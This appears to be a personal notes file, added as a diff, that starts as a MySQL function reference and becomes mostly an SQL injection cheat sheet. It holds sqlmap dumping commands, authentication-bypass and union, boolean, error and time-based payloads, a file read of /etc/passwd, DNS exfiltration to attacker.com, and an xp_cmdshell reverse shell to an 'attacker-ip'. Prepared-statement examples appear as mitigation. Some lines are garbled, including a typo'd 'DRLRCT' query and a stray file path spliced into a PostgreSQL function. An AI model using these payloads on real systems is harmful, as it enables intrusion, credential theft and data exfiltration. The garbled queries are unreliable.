@@ -1,0 +1,506 @@
+♨Functions😶‍🌫
+MySQL: String Functions
+       Numeric Functions
+       Date and Time Functions
+
+**********MySQl String Functions: definitions	Returns the character for each integer passes*************************
+1.	definitions	Returns the character for each integer passes	
+ 1. SELECT CHAR(70, 65, 67, 69) ;
+
+2. SELECT CHAR(65, 67.3, 69.3) ;
+ 2.	CONCAT()	Returns concatenated string	
+SELECT CONCAT(name, aggregate) AS "NAME Jacobs"
+
+FROM student WHERE age = 14 OR age = 16;
+
+3.	LOWER() /LCASE()	Returns the argument in lowercase	
+SELECT LOWER('GEEKSFORGEEKS') AS "LowerName1",
+
+LOWER('Geeks For Geeks') AS "LowerName2" ;
+
+4.	SUBSTRING(), SUBSTR()	Returns the substring as specified	
+ 1. SELECT SUBSTR('ABSDEFG', 3, 4) "Subs" ;
+
+ 2. SELECT SUBSTR('ABCDEFG', -5, 4) "Subs" ;
+
+5.	UPPER()/UCASE()	Converts to uppercase	
+    SELECT UPPER('Large') "Uppercase" ;
+
+    or SELECT UCASE('Large') "Uppercase";
+
+6.	TRIM()	Removes leading and trailing spaces	SELECT TRIM('Bar One') ;
+7.	LENGTH()	Returns the length of a string in bytes	SELECT LENGTH('CANDIDE') "Length in characters" ;
+
+
+
+*******MySQL Numeric Functions**********
+MOD()	Returns the remainder of one expression by diving y another expression.	SELECT MOD(11, 4) "Modulus" ;
+2.	POWER()/POW()	Returns the value of one expression raised to the power of another expression	SELECT POWER(3, 2) "Raised" ;
+3.	ROUND()	Returns numeric expression rounded to an integer. Can be used to round an expression to a number of decimal points.	SELECT ROUND(15.193, 1) "Round" ;
+4.	SIGN()	This function returns sign of a given number.	SELECT SIGN(-15) "Sign" ;
+5.	SQRT()	Returns the non-negative square root of numeric expression.	SELECT SQRT(26) "Square root" ;
+6.	TRUNCATE()	Returns numeric exp1 truncate to exp2 decimal places. If exp2 is 0, then the result will have no decimal point	DRLRCT TRUNCATE(15.79, 1) "Truncate" ;
+
+
+
+******Date and Time Functions******
+             🫠
+CURDATE()/
+CURRENT_DATE()/
+CURRENT_DATE
+
+Returns the current date.	SELECT CURDATE() ;
+2	DATE()	Extracts the date part of a date or date-time expression.	SELECT DATE('2020-12-31 01:02:03') ;
+3	MONTH()	Returns the month from the date passed.	SELECT MONTH('2020-12-31') ;
+4	YEAR()	Returns the year	SELECT YEAR('2020-12-31') ;
+5	NOW()	Returns the time at which the function executes.	SELECT NOW() ;
+6	SYSDATE()	Returns the current date and time.	
+SELECT NOW(), SLEEP(2), NOW() ;
+
+or SELECT SYSDATE(), SLEEP(2), SYSDATE() ;
+
+
+
+
+
+💥Basics of SQl💥
+Version: SELECT @@version;
+Comments: / / or #
+Current user: SELECT user(); || SELECT system­_user()
+List users: SELECT user FROM mysql.u­ser;
+List password hashes: SELECT host, user, password FROM mysql.u­ser;
+Current Database: SELECT database()
+List databases: SELECT schema­_name FROM inform­ati­on_­sch­ema.sc­hemata; || SELECT distin­ct(db) FROM mysql.db
+List tables: SELECT table_­sch­ema­,ta­ble­_name FROM inform­ati­on_­sch­ema.tables WHERE table_­schema != ‘mysql’ AND table_­schema != ‘infor­mat­ion­_sc­hema’
+List columns: SELECT table_­schema, table_­name, column­_name FROM inform­ati­on_­sch­ema.co­lumns WHERE table_­schema != ‘mysql’ AND table_­schema != ‘infor­mat­ion­_sc­hema’
+Find Tables From Column Name: SELECT table_­schema, table_name FROM inform­ati­on_­sch­ema.co­lumns WHERE column­_name = ‘usern­ame’;
+Time delay: SELECT BENCHM­ARK­(10­000­00,­MD5­(‘A’)); SELECT SLEEP(5); # >= 5.0.12
+Local File Access: UNION ALL SELECT LOAD_F­ILE­(‘/­etc­/pa­sswd’) 
+Hostna­me/IP Address: SELECT @@host­name;
+Create user: CREATE USER test1 IDENTIFIED BY ‘pass1′;
+Delete user Location of the db file: SELECT @@datadir;
+OR: Operator
+mysql_real_escape_string(): is a PHP function designed to escape special characters in a string before inserting them in MySQL queries.
+mysqli_real_escape_string() && PDO::quote(): are alternatives to the above 👆
+Example Syntax: // Usage of mysql_real_escape_string()  |   $escaped_value = mysql_real_escape_string($user_input);
+SIN(): function is used to returns the sine of a number.
+Cos(): function is used to return the cosine of a number.
+an() function is used to return the tangent of a number.
+ATN2() : It is the function that return's the arc tangent of two number's. Syntax : ATN2(val1, val2)
+DATENAME() function : Syntax : DATENAME(interval, date)
+DATENAME() function and getting the month part of the specified date: SELECT DATENAME(month, '2021/01/06');
+ATN2() : It is the function that returns the arc tangent of two numbers. Syntax: ATN2(val1, val2)
+
+💥SQLMap Basics💥
+Instalation: sudo apt-get install sqlmap 
+To Attack a database of a Vulnerable Website: sqlmap -u "Vulnerable URL" --dbs
+To get tables from a database of Vulnerable Website: sqlmap -u "Vulnerable URL" --table -D [Name of database]
+To get columns of a table on the Vulnerable Website: sqlmap -u "Vulnerable URL" --columns -D [Name of database] -T [table name]
+To dump all values of the table of Vulnerable Website: sqlmap -u "Vulnerable URL" --dump -D [Name of database] -T [table name]
+
+💥Manual Testing with SQLMap♨
+Quick detect INTEGERS	select 1 and row(1,­1)>­(select count(),conc­at(­CON­CAT­(@@­VER­SIO­N),­0x3­a,f­loo­r(r­and()2))x from (select 1 union select 2)a group by x limit 1))
+2.	Quick detect STRINGS:	'+(select 1 and row(1,­1)>­(select count(),conc­at(­CON­CAT­(@@­VER­SIO­N),­0x3­a,f­loo­r(r­and()2))x from (select 1 union select 2)a group by x limit 1))+'
+3.	Clear SQL Test:	produc­t.p­hp?id=4 produc­t.p­hp?­id=5-1 produc­t.p­hp?id=4 OR 1=1 produc­t.p­hp?­id=-1 OR 17-7=10
+4.	Blind SQL Injection	SLEEP(­25):  SELECT BENCHM­ARK­(10­000­00,­MD5­('A'));
+5.	 SQL injection	Example {
+Produc­tID=1 OR SLEEP(­25)=0 LIMIT 1-- Produc­tID=1) OR SLEEP(­25)=0 LIMIT 1-- Produc­tID=1' OR SLEEP(­25)=0 
+LIMIT 1-- Produc­tID=1') OR SLEEP(­25)=0 LIMIT 1-- Produc­tID=1)) OR SLEEP(­25)=0 LIMIT 1-- Produc­tID­=SELECT SLEEP(­25)--
+}
+
+**Testing a website with SQLMap***
+1. First we have to test for vulnerabilities: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs 
+2. Press Y to continue all the processes
+3. Now we have to list the table information:  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 
+-D acuart --tables 
+4. Now we have to retrieve information about a table: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 
+-D acuart -T artists --columns #-T is for "Table"
+5. Now to Dump the columns: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
+-D acuart -T artists -C aname --dump
+
+
+
+
+
+~~~~~~SQL Injection: Bypassing Authentication ~~~~~~~~~{
+
+    ♔ Bypassing with SQL ♔
+
+1. Bypassing Authentication	 {
+    ' OR 1=1 --
+    " OR "1"="1"
+    admin' --
+    ' OR '1'='1' --
+}
+ 
+2. A Vulnerable Query {
+SELECT * FROM users WHERE username = 'admin' AND password = '';
+# If injected makes the bypass by showing True
+}
+
+3. Extracting the "Database" version {
+SELECT @@version; (MySQL, MSSQL)
+SELECT version(); (PostgreSQL)
+SELECT banner FROM v$version; (Oracle)
+}
+
+4. Find curent "Database User" {
+SELECT user(); (MySQL, PostgreSQL)
+SELECT system_user; (MSSQL)
+SELECT session_user; (PostgreSQL)
+}
+
+♔ Union-Based SQL ♔
+
+1. Extract Usernames and Passwords {
+' UNION SELECT null, username, password FROM users --
+}
+
+2. Determine column count {
+' ORDER BY 3 --
+}
+
+
+♔ Error Based Injections ♔
+
+1. Database Error retrieval {
+' UNION SELECT 1,2,3,4,5,@@version
+}
+
+
+♔ Boolean Based Injections ♔
+
+1. Database Name Extraction {
+' AND (SELECT SUBSTRING(database(),1,1))='A' 
+}
+
+
+♔ Time-Based Injections ♔
+
+1. MySQL Time-Delay {
+' OR IF(1=1, SLEEP(5), 0) --
+}
+
+2. MSSQL Time-Based {
+' OR 1=1; WAITFOR DELAY '0:0:5' --
+}
+
+3. Oracle Time-Based {
+dbms_pipe.receive_message(('a'),10)
+}
+
+4. MSSQL: 10 Second Delay {
+WAITFOR DELAY '0:0:10'
+}
+
+5. PostgreSQl: Time-Based {
+SELECT pg_sleep(10)
+}
+
+6. MySQL: Ten Seconds {
+SELECT SLEEP(10)
+}
+
+
+
+♔ Extracting from "Other" Databases ♔
+
+1. MySQL List All Databases {
+SELECT schema_name FROM information_schema.schemata;
+}
+
+2. MSSQL Extract Databases {
+SELECT name FROM master.dbo.sysdatabases;
+}
+
+3. Oracle Extra Tables {
+SELECT table_name FROM all_tables;
+}
+
+
+♔ Extracting Tables and Columns ♔
+
+1. MySQl List Tables {
+SELECT table_name FROM information_schema.tables;
+}
+
+2. MSSQL List Names {
+SELECT name FROM sysobjects WHERE xtype='U';
+}
+
+3. Oracle List Columns {
+SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
+}
+
+♔ SQL Injections for "Other"♔
+
+1.  Oracle {
+String: `'foo'
+Extracting Substring: SUBSTR('foobar', 4, 2)
+Comment Syntax: --comment
+Database Version: SELECT banner FROM v$version
+List Tables: SELECT * FROM all_tables
+}
+
+2. MSSQL {
+Extracting Substring:  SUBSTRING('foobar', 4, 2)
+Comment Syntax: --comment or /*comment*/
+Database Version: SELECT @@version
+List Tables: SELECT * FROM information_schema.tables
+}
+
+3. PostgreSQL {
+String: 'bar'`
+Extracting Substring: SUBSTRING('foobar', 4, 2)	
+Comment Syntax: --comment or /*comment*/
+Database Version: SELECT version()
+List Tables: SELECT * FROM information_schema.tables
+}
+
+4. MySQl {
+String: 'foo'+'bar'
+Extracting Substring: SUBSTRING('foobar', 4, 2)
+Comment Syntax: #comment or -- comment
+Database Version: SELECT @@version
+List Tables: SELECT * FROM information_schema.tables
+}
+
+♔ Out-of-Band Injections♔
+
+1. DNS Exfiltration Attack:	SELECT load_file(CONCAT('\\\\',(SELECT database()),'.attacker.com\\data.txt'))
+
+
+♔ Checking Priviledges♔
+
+1. MySQL: List Current User {
+SELECT user(); 
+}
+
+2. PostgreSQL: List Current User {
+SELECT current_user;
+}
+
+3. MySQL: List ALl Users {
+SELECT user, host FROM mysql.user;
+}
+
+4. MySQL: Admin Priviledges {
+SHOW GRANTS FOR 'root'@'localhost';
+}
+
+
+💥Executing System Commands via SQL Injection💥
+
+1. MSSQL: WHOAMI {
+EXEC xp_cmdshell 'whoami';
+}
+
+2. MySQL: Retrieve User ID {
+SELECT sys_exec('id');
+}
+
+3. MSSQL: Create Reverse Shell {
+EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);..."'
+}
+
+♔ DNS-Based SQL Injection ♔
+Uses SQLi to trigger DNS lookups.
+
+1. Oracle {
+SELECT UTL_INADDR.get_host_address('attacker.com');
+}
+
+2. MySQL {
+exec master..xp_dirtree '//attacker.com/a'
+}
+
+3. PostgreSQL {
+copy (SELECT '') to program 'nslookup attacker.com'
+}
+
+4. MySQL {
+LOAD_FILE('\\\\attacker.com\\a')
+}
+
+
+
+
+💥Using SQL in "Parameterized Queries" 💥
+
+Example String:
+String query = "SELECT userID, userName, passwordHash"+
+               " FROM users WHERE userName = '" 
+               + request.getParameter("user") + "'";
+int userID = -1;
+HashMap userGroups = new HashMap();
+try 
+{
+  Statement statement = connection.createStatement();
+  ResultSet rs = statement.executeQuery(query);
+  rs.first();
+  userID = rs.getInt("userID");
+    
+  if (!hashOf(request.getParameter("password")).equals(rs.getString("passwordHash"))) 
+  {
+    throw BadLoginException();
+  }
+
+  String userGroupQuery = "SELECT group FROM groupMembership"+
+                         " WHERE userID = " + userID;
+    
+  rs = statement.executeQuery(userGroupQuery);
+    
+  while (rs.next()) 
+  {
+    userGroup.put(rs.getString("group"), true);
+  }
+} 
+catch (SQLException e){}
+catch (BadLoginException e){}
+
+
+1. A Example of a Query Vulnerability:
+String query = "INSERT INTO users VALUES(" + 
+        request.getParameter("userName") + ");";
+
+
+
+
+**Sql on Login Pages***
+1. First try “‘” on both username && password
+2. Now the important part, is focusing on what to place in the password field. Depends on versions.
+Select id from users where username=’username’ and password=’password’ or 1=1--+
+3. ' 0r 1=1--+
+
+
+
+**PHP Code for Admin Bypass***
+<?php
+// Assume the usage of mysql_real_escape_string()
+$_POST['username'] = "admin' OR '1'='1'; -- ";
+
+// Login Query Using mysql_real_escape_string()
+$username = mysql_real_escape_string($_POST['username']);
+$password = mysql_real_escape_string($_POST['password']);
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+// Execute the query and process the result
+?>
+
+**PHP Prepared Statements***
+<?php
+// Establish MySQL Connection
+$mysqli = new mysqli("localhost", "username", "password", "database");
+
+// Login Query Using Prepared Statement
+$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->bind_param("ss", $username, $password);
+
+// Set Values Safely
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Execute the Query
+$stmt->execute();
+$result = $stmt->get_result();
+
+// Process the Result
+while ($row = $result->fetch_assoc()) {
+    // Process the result
+}
+?>
+
+
+
+Comments:
+
+Oracle	--comment
+Microsoft	--comment
+/*comment*/
+PostgreSQL	--comment
+/*comment*/
+MySQL	#comment
+-- comment [Note the space after the double dash]
+/*comment*/
+
+
+
+"Conditional errors
+You can test a single boolean condition and trigger a database error if the condition is true.
+
+Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+
+
+"Batched (or stacked) queries"
+You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
+
+Oracle	Does not support batched queries.
+Microsoft	QUERY-1-HERE; QUERY-2-HERE
+QUERY-1-HERE QUERY-2-HERE
+PostgreSQL	QUERY-1-HERE; QUERY-2-HERE
+MySQL	QUERY-1-HERE; QUERY-2-HERE
+
+
+"Time delays"
+You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+
+Oracle	dbms_pipe.receive_message(('a'),10)
+Microsoft	WAITFOR DELAY '0:0:10'
+PostgreSQL	SELECT pg_sleep(10)
+MySQL	SELECT SLEEP(10)
+
+
+
+"Conditional time delays"
+You can test a single boolean condition and trigger a time delay if the condition is true.
+
+Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+
+
+
+
+"DNS lookup"
+You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+
+Oracle	
+(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+The following technique works on fully patched Oracle installations, but requires elevated privileges:
+
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+MySQL	
+The following techniques work on Windows only:
+
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE
+
+
+
+
+DNS lookup with data exfiltration
+You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+
+Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+PostgreSQL	create OR replace function f() returns void as/home/daily/Tool_Box/firewall.py$$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+MySQL	The following technique works on Windows only:
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+
+References: "https://portswigger.net/web-security/sql-injection/cheat-sheet" && "https://www.geeksforgeeks.org/mitigation-sql-injection-attack-using-prepared-statements-parameterized-queries/"
